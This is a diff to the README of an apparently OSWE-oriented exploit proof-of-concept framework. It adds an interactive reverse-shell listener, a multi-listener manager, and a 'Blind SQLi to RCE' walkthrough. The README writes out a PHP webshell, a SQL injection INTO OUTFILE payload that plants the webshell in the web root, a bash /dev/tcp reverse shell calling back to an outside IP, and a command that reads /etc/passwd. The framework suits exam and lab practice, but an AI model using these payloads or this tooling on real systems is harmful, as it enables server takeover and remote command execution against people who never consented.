@@ -6,24 +6,54 @@ This skeleton implements all advanced features from "Building a Reusable OSWE Po
 
 - ✅ **Structured Logging** - Audit trail with color-coded console output
 - ✅ **Payload Server** - HTTP server for hosting and callbacks
+- ✅ **Interactive Listener** - Reverse shell capture with select() multiplexing
 - ✅ **Stage Management** - Dependencies, retries, and orchestration
 - ✅ **Blind SQLi Module** - Binary search + async extraction
 - ✅ **Context Management** - Clean state management with dataclasses
 - ✅ **Error Handling** - Graceful failures with detailed logging
+- ✅ **Liveness Check** - Pre-exploitation target verification
+- ✅ **Two Patterns** - Stage-based for complex exploits, step-based for linear flows
+
+## Skeleton Variants
+
+### 1. `poc_advanced.py` - Full-Featured
+Production-ready with all modules:
+- Stage management with dependencies
+- Payload server integration
+- Interactive listener for reverse shells
+- Blind SQLi with binary search
+- Structured logging with file output
+
+### 2. `poc_simple.py` - Lightweight
+Single-file standalone skeleton:
+- No external module dependencies
+- Inline payload server and listener
+- Step-based execution pattern
+- Perfect for quick/simple exploits
+
+### 3. `examples/step_based_example.py` - Step Pattern
+Demonstrates step-based exploitation using advanced modules:
+- Sequential step execution
+- State tracking across steps
+- Alternative to stage-based for linear exploits
 
 ## Directory Structure
 
 ```
 advanced-skeleton/
-├── README.md              # This file
-├── poc_advanced.py        # Complete production skeleton
-├── modules/               # Reusable modules
-│   ├── __init__.py       # Package initialization
-│   ├── logger.py         # Structured logging
-│   ├── payload_server.py # HTTP payload server
-│   ├── stages.py         # Stage management
-│   └── sqli.py           # Blind SQLi with binary search
-└── examples/             # Usage examples (created below)
+├── README.md                    # This file
+├── QUICKSTART.md               # Quick start guide
+├── poc_advanced.py             # Full-featured production skeleton
+├── poc_simple.py               # Lightweight single-file skeleton
+├── modules/                    # Reusable modules
+│   ├── __init__.py            # Package initialization
+│   ├── logger.py              # Structured logging
+│   ├── payload_server.py      # HTTP payload server
+│   ├── listener.py            # Interactive reverse shell listener
+│   ├── stages.py              # Stage management
+│   └── sqli.py                # Blind SQLi with binary search
+└── examples/                   # Usage examples
+    ├── step_based_example.py  # Step-based pattern demo
     ├── example_sqli.py
     ├── example_xss.py
     └── example_full.py
@@ -161,7 +191,70 @@ if server.wait_for_callback("/xss-callback", timeout=60):
 server.stop()
 ```
 
-### 3. Stage Management Module (`modules/stages.py`)
+### 3. Interactive Listener Module (`modules/listener.py`)
+
+**Features:**
+- Interactive reverse shell capture using `select()` multiplexing
+- Professional banner on connection
+- Non-blocking operation (runs in background thread)
+- Initial commands on connection (whoami, hostname, id, pwd)
+- Single command execution mode
+- Multi-listener management support
+
+**Usage:**
+
+```python
+from modules import InteractiveListener
+
+# Create and start listener
+listener = InteractiveListener(
+    port=4444,
+    initial_commands=["whoami", "hostname", "id", "pwd"]
+)
+
+listener.start(blocking=False)
+
+# Trigger reverse shell on target...
+
+# Wait for connection
+if listener.wait_for_connection(timeout=60):
+    print("Shell connected!")
+    
+    # Interactive shell (Ctrl+C to exit)
+    listener.interactive_shell()
+    
+    # Or send single command
+    # result = listener.send_command("cat /etc/passwd")
+    # print(result)
+else:
+    print("Timeout - no connection")
+
+# Cleanup
+listener.stop()
+```
+
+**Listener Manager (for multi-shell exploits):**
+
+```python
+from modules import ListenerManager
+
+manager = ListenerManager()
+
+# Start multiple listeners
+manager.start_listener("shell1", 4444)
+manager.start_listener("callback", 8000)
+
+# Wait for any connection
+if manager.wait_for_connection(timeout=60):
+    shell = manager.get_listener("shell1")
+    if shell and shell.is_connected():
+        shell.interactive_shell()
+
+# Stop all
+manager.stop_all()
+```
+
+### 4. Stage Management Module (`modules/stages.py`)
 
 **Features:**
 - Automatic stage numbering
@@ -202,7 +295,7 @@ for result in manager.get_results():
 manager.print_summary()
 ```
 
-### 4. Blind SQLi Module (`modules/sqli.py`)
+### 5. Blind SQLi Module (`modules/sqli.py`)
 
 **Features:**
 - Binary search (much faster than linear)
@@ -253,20 +346,30 @@ sqli = BlindSQLi(url=url, dialect=PostgreSQLDialect())
 sqli = BlindSQLi(url=url, dialect=MSSQLDialect())
 ```
 
-## Complete Example: Blind SQLi to RCE
+## Complete Example: Blind SQLi to RCE with Listener
 
 ```python
 #!/usr/bin/env python3
-from modules import create_logger, BlindSQLi, MySQLDialect, PayloadServer
+from modules import (
+    create_logger, 
+    BlindSQLi, 
+    MySQLDialect, 
+    PayloadServer,
+    InteractiveListener
+)
 
 # Setup
 log = create_logger("sqli_to_rce")
 server = PayloadServer(port=8000)
+listener = InteractiveListener(port=4444)
 
 # Add webshell
 php_shell = "<?php system($_REQUEST['cmd']); ?>"
 server.add_payload("/shell.php", php_shell)
 server.start(blocking=False)
+
+# Start listener
+listener.start(blocking=False)
 
 # Stage 1: Exploit SQLi
 log.stage("SQL Injection")
@@ -287,18 +390,56 @@ log.stage("File Write via SQLi")
 shell_url = server.get_url("/shell.php")
 write_payload = f"'; SELECT '<?php system($_REQUEST[\"cmd\"]); ?>' INTO OUTFILE '/var/www/html/shell.php'--"
 
-# Execute file write (implementation depends on app)
-# ...
+# Stage 3: Trigger reverse shell
+log.stage("Reverse Shell")
+rev_shell_cmd = f"bash -c 'bash -i >& /dev/tcp/10.10.14.5/4444 0>&1'"
+# Trigger via webshell or SQLi...
 
-# Stage 3: Verify RCE
-log.stage("RCE Verification")
-import requests
-response = requests.get("http://target.com/shell.php?cmd=id")
-log.success(f"RCE Output: {response.text}")
+# Stage 4: Capture shell
+if listener.wait_for_connection(timeout=60):
+    log.success("Shell connected!")
+    listener.interactive_shell()
 
 # Cleanup
 server.stop()
+listener.stop()
 log.close()
+```
+
+## Utility Functions
+
+### Liveness Check
+
+Verify target is reachable before exploitation:
+
+```python
+# In poc_advanced.py - automatically called
+from poc_advanced import liveness_check
+
+if not liveness_check(ctx):
+    ctx.logger.error("Target not reachable")
+    sys.exit(1)
+```
+
+### Stage-Based vs Step-Based
+
+**Stage-Based** (recommended for complex exploits):
+- Dependencies between stages
+- Retry logic
+- Optional stages
+- Detailed orchestration
+
+**Step-Based** (for linear exploits):
+- Sequential execution
+- Simpler code structure
+- State tracking across steps
+- Good for straightforward flows
+
+```python
+# Choose your pattern in poc_advanced.py
+USE_STEP_BASED = False  # Set to True for step-based
+
+# Or use poc_simple.py for standalone step-based
 ```
 
 ## OSWE Exam Tips
